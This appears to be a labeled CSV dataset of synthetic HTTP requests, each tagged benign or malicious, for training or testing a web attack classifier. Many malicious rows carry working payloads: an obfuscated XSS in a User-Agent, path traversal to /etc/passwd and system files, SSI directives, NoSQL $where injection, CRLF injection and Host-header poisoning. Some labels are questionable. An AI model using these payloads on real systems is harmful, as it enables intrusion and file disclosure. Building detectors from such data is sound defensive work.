label,text
benign,"GET /assets/img/user_avatars/23f89a7c-profile-pic.png HTTP/1.1
Host: secure-user-portal.net
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://secure-user-portal.net/dashboard
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Connection: keep-alive"
malicious,"POST /user/settings/update HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36""><svg/onload=eval(atob('YWxlcnQoJ1NldHRpbmcgQXR0YWNrJyk='))>
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://online-retail-store.biz
Referer: https://online-retail-store.biz/user/settings
Connection: keep-alive

email=jane.doe%40mailservice.com"
benign,"POST /feedback/send HTTP/1.1
Host: techhelpdesk.supporthub.co
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
Referer: https://techhelpdesk.supporthub.co/feedback
Origin: https://techhelpdesk.supporthub.co
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.100 Safari/537.36
Cookie: session_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
Connection: keep-alive

name=Javier+Martinez&email=javier.martinez%40supporthub.co&subject=Feature+Request&message=Could+you+add+a+dark+mode+option+to+the+dashboard+interface%3F+Thanks."
malicious,"POST /accounts/verify-signature HTTP/1.1
Host: validation-nexus.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 168
Connection: keep-alive

user_signature_check=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%5A"
benign,"POST /feedback/submit HTTP/1.1
Host: feedback-portal.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Content-Length: 87
Connection: keep-alive
Origin: https://feedback-portal.biz
Referer: https://feedback-portal.biz/feedback
Cookie: session=3f8c4d2b1a7f96e4c5d3e2a1b0f9c8d7

user=julian_williams&comments=VGhlIGFwcCBpcyB2ZXJ5IGludWV0ZWQgYW5kIHVzZXItZnJpZW5kbHksIGV4Y2VsbGVudGx5IQ=="
malicious,"POST /api/v3/items/search HTTP/1.1
Host: api-hub.financecentral.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Content-Type: application/json
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.8
Content-Length: 55

{""filePath"": ""C:\\Windows\\System32\\drivers\\etc\\hosts""}"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: image/*,*/*;q=0.8
Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.5,en;q=0.3
DNT: 1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Cache-Control: max-age=0"
benign,"POST /log/input HTTP/1.1
Host: secure-user-portal.net
Content-Type: text/plain
Origin: https://login.secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/113.0
Content-Length: 44
Connection: keep-alive

input=search&query=wireless+headphones&session=abc123"
benign,"POST /api/v4/accounts/password/reset-request HTTP/1.1
Host: global-finance-hub.co
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1
Origin: https://global-finance-hub.co
Content-Length: 44

{""email"":""marie.leblanc@global-finance-hub.co""}"
benign,"GET /api/data/feed?after=QmFzZTY0U3RyaW5nMTIz&config=eyJsaW1pdCI6MTAsImZpbHRlcnMiOlsicmVhZHkiLCJhY3RpdmUiXX0= HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Referer: https://community.game-dev-forum.org/home
Connection: close"
benign,"POST /account/profile/update HTTP/1.1
Host: user-preferences-hub.io
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RgP7YUmyPq2Upuw
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Length: 296
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.ABC123xyz

------WebKitFormBoundary4RgP7YUmyPq2Upuw
Content-Disposition: form-data; name=""username""

robert.turner
------WebKitFormBoundary4RgP7YUmyPq2Upuw
Content-Disposition: form-data; name=""email""

robert.turner@exampleuser.net
------WebKitFormBoundary4RgP7YUmyPq2Upuw
Content-Disposition: form-data; name=""bio""

Open-source enthusiast and tech blogger.
------WebKitFormBoundary4RgP7YUmyPq2Upuw
Content-Disposition: form-data; name=""location""

Portland, Oregon
------WebKitFormBoundary4RgP7YUmyPq2Upuw--"
benign,"GET /ping HTTP/1.1
Host: metrics-dashboard.aiobservability.io
User-Agent: Python-urllib/3.10
Accept: */*
DNT: 1
Connection: close"
benign,"GET /user/profile/settings?cmd=view_details HTTP/1.1
Host: secure-user-portal.net
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Accept-Language: en-GB,en;q=0.9
Cache-Control: no-cache"
benign,"POST /login/user HTTP/1.1
Host: global-media-hub.tv
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Accept-Encoding: br, gzip, deflate, sdch
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Referer: https://global-media-hub.tv/login
Connection: Keep-Alive

username=johndoe_tv&password=media12345&redirect_uri=https%3A%2F%2Fglobal-media-hub.tv%2Fprofile%2Fsettings"
benign,"GET /downloads/software/setup-v4.2.1.exe HTTP/1.1
Host: fast-delivery-downloads.io
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Referer: https://fast-delivery-downloads.io/software/list
Cookie: download_token=4810b0871fde123f2d4a0bb695f4a1cd
DNT: 1
Sec-CH-UA: ""Chromium"";v=""114"", ""Google Chrome"";v=""114"", "";Not A Brand"";v=""99""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Windows""
Via: 2.0 cloudfront"
benign,"POST /user-posts/comment HTTP/1.1
Host: urban-gardening.co.uk
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: https://urban-gardening.co.uk
Referer: https://urban-gardening.co.uk/user-posts/4781
Cookie: sid=12f7cd89ea26ff4a0273
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
X-CSRF-Token: d285b7adef9f9a5247a61c3c7e

author_name=Tommy+Green&comment_text=This+tip+about+composting+works+great+in+my+small+balcony+garden.+Thanks!"
benign,"OPTIONS /api/v2/items HTTP/1.1
Host: research-data-portal.edu
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Accept: application/json
Connection: keep-alive
Access-Control-Request-Method: OPTIONS
Origin: https://research-data-portal.edu
X-Forwarded-For: 172.56.89.12"
malicious,"GET /shop/cart/display HTTP/1.1
Host: urban-shop-network.co
X-Forwarded-Host: evil-tracking-domain.net
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
Connection: close"
benign,"POST /user/submit_review HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://online-retail-store.biz/products/tech/headphones
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.5
Cookie: user_session=6d7cd97f451b3a02

product_id=2085&rating=5&comment=TG92ZSB0aGUgcXVhbGl0eSBvZiB0aGUgaGVhZHBob25lcy4gV29yayB3b25kZXJmdWxseS4="
benign,"DELETE /v3/inventory/items/45fGHj HTTP/1.1
Host: warehouse-updates.cloud-inventory.net
Authorization: Token 4573-93abcdf-2384fd9300e
X-Confirm-Delete: true
User-Agent: curl/7.85.0
Accept: */*
Connection: close"
malicious,"GET /api/v1/data/summary HTTP/1.1
Host: analytics.global-insight.tech
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 <!--#config errmsg=""SSI_Error_Triggered_Successfully""--> <!--#echo var=""REMOTE_ADDR""-->
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
Cache-Control: no-cache"
malicious,"GET /app/account/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
X-User-Filter: {""$where"": ""if(this.isAdmin){var start=new Date();while((new Date())-start<5000){};}return true;""}
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
malicious,"GET /app/user/settings/theme-dark%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0a%0d%0aInjectedBodyHere HTTP/1.1
Host: secure-user-portal.net
User-Agent: Python-urllib/3.9
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://secure-user-portal.net/app/dashboard
Connection: close"
malicious,"GET /page/render?template=../../../../../../../../etc/passwd HTTP/1.1
Host: smart-home-dashboard.io
User-Agent: Python-urllib/3.9
Accept: text/html
Accept-Language: en-US,en;q=0.9
Connection: close"
benign,"POST /profile/update HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Accept-Language: en-us
Referer: https://my-personal-blog-site.info/account/settings
Connection: keep-alive

display_name=Sam+O%27Neill%25&about=Author+and+blogger+%23Tech%26Travel+enthusiast.+Coffee%23Addict."
benign,"POST /contact-us/send-message HTTP/1.1
Host: greenhorizons.ag
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Referer: https://greenhorizons.ag/contact-us
Origin: https://greenhorizons.ag
Cookie: _gh_session=2439a3769b7cab8e06bf0d517eb43ec6

name=Anna+Becker&email=anna.becker%40greenmail.ag&subject=Volunteer+Opportunities&message=I+am+interested+in+volunteering+for+upcoming+events.+Please+send+more+information."
benign,"GET /user/activity/recent?session=abc123xyz&callback=processData HTTP/1.1
Host: secure-user-portal.net
Accept: application/javascript
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Cookie: session_token=fe13b457c9259d6f742a98b1e8b8c1d0;
Connection: keep-alive"
benign,"OPTIONS /api/users/me/settings HTTP/1.1
Host: identity-management-cloud.biz
Origin: https://dashboard.enterprise-solutions.com
Access-Control-Request-Method: GET
Access-Control-Request-Headers: X-Requested-With
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
Accept: application/json
Connection: keep-alive"
benign,"GET /data/stock-prices?callback=processData&symbol=AMZN HTTP/1.1
Host: financial-data-stream.ai
Accept: application/javascript, */*;q=0.7
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Referer: http://partner-finance-portal.ai/reports"
malicious,"GET /downloads/images/%2E%2E%2F%2E%2E%2F%2E%2E/passwd HTTP/1.1
Host: media-digital-archive.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive
Referer: https://media-digital-archive.ai/gallery/latest"
benign,"POST /tracking/heartbeat HTTP/1.1
Host: streaming-service-protocol.org
Origin: https://watch.streaming-service-protocol.org
Content-Type: text/plain
Content-Length: 34
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36

event=heartbeat&session_id=2a9f4be3a7dc"
benign,"GET /gallery/summer2024/highlights HTTP/1.1
Host: photo-archive-collection.org:5001
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.8
Referer: https://photo-archive-collection.org/home
Connection: keep-alive"
benign,"GET /api/media/latest HTTP/1.1
Host: online-retail-store.biz
X-Api-Token: 1fcae8769b774ef3959f1b6e667bc302
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Via: 1.1 varnish"
benign,"GET /search?q=wireless+headphones&category=audio HTTP/1.1
Host: tech-gadget-outlet.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Referer: https://tech-gadget-outlet.com/"
benign,"POST /user/profile/update HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Content-Length: 269
Referer: https://secure-user-portal.net/user/settings
Cookie: sessionid=7f9a4b3352e3e65d1c659243a85f7612; csrftoken=ed7f22eafat4ab89a1c7b1a2f37e9300
Cache-Control: no-cache

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""first_name""

Elena
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""last_name""

Marquez
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""bio""

Loves hiking and urban photography.
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""timezone""

America/Chicago
------WebKitFormBoundary7MA4YWxkTrZu0gW--"
malicious,"GET /load?file=..%c0%ae..%c0%af..%c0%ae..%c0%afvar%c0%aflog%c0%afaccess.log HTTP/1.1
Host: logs-access-portal.org
User-Agent: curl/7.77.0
Accept: */*
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
benign,"GET /v1/orders/7a12bc45-88f3 HTTP/1.1
Host: secure-user-portal.net
Accept: application/json
Authorization: Bearer mY5uPeRSeCReT12345token
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept-Language: en-US,en;q=0.9
Connection: close"
benign,"GET /assets/icons/icon-menu.svg HTTP/1.1
Host: design-craft-studio.io
Accept: image/svg+xml,image/*;q=0.8,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://design-craft-studio.io/dashboard
Connection: keep-alive"
benign,"GET /blog/articles/healthy-lifestyle-tips HTTP/1.1
Host: holistic-wellness-hub.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.6
DNT: 1
Connection: keep-alive
Referer: https://holistic-wellness-hub.info/blog"
benign,"GET /forum/section/announcements?page=2 HTTP/1.1
Host: nexgen-forums.biz
Connection: close
Accept: text/html
Referer: https://nexgen-forums.biz/
Cookie: sessionid=8a4c9f7bdc38255b03e3f4401a2e4c9a
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Mobile Safari/537.36"
malicious,"POST /app/user/profile HTTP/1.1
Host: green-energy-hub.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin: https://green-energy-hub.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Content-Length: 70
Connection: keep-alive

user_bio=Environmental+scientist+%3C%21--%23iNcLuDe+vIrTuAl%3D%22%2Fvar%2Flog%2Fsyslog%22+--%3E"
benign,"GET /home HTTP/1.1
Host: explore-news-network.tv
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Cookie: user_prefs_b64=eyJmZ250IjoiZmFtaWx5IiwibGF5b3V0IjoiZ3JpZCIsImZvbnRTaXplIjoxNCwic2Nyb2xsIjpmYWxzZX0=; session_id=YZ09a3JmcLJDS5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Connection: keep-alive"
benign,"GET /api/v3/events/upcoming?region=emea HTTP/1.1
Host: eventhub-streaming.net
Accept: application/json
X-Requested-With: XMLHttpRequest
Origin: https://dashboard.eventhub-streaming.net
Authorization: Bearer ZHVtbXlfbXVsdGlfc2lnbg==
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"
malicious,"PUT /api/v1/settings/template HTTP/1.1
Host: design-studio-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Content-Type: application/json
Accept: application/json
Content-Length: 58
Cookie: template_file_path=../../../../var/www/html/config.php%00json; authToken=ea7fc283d6db9482

{""templateName"":""default"",""content"":""<h1>Welcome to the Portal</h1>""}"
benign,"GET /user/details?id=17 HTTP/1.1
Host: secure-user-portal.net
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Referer: https://secure-user-portal.net/dashboard
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Accept-Language: en-US,en;q=0.5"
